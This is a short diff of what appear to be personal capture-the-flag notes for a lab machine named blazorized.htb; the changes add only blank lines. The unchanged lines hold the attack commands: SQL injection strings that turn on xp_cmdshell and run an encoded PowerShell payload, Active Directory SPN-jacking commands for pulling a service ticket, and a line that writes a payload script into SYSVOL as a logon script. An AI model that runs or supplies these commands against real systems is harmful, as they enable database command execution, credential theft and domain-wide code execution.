@@ -17,11 +17,13 @@ JWT:
 }
 
 
+
 Inject:
 
 www'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
 
 www'; exec master..xp_cmdshell 'powershell#3base64';-- -
+
 
 
 SPN Jacking
@@ -35,9 +37,11 @@ Set-DomainObject -Identity RSA_4810 -SET @{serviceprincipalname='xx/xx'}
 Get-DomainSPNTicket -SPN xx/xx
 
 
+
 Login bat:
 
 'powershell #3 base64 payload'| Out-File -FilePath C:\windows\SYSVOL\sysvol\blazorized.htb\scripts\A32FF3AEAA23\shell.bat -Encoding ASCII
+
 
 
 Set ScriptPath:
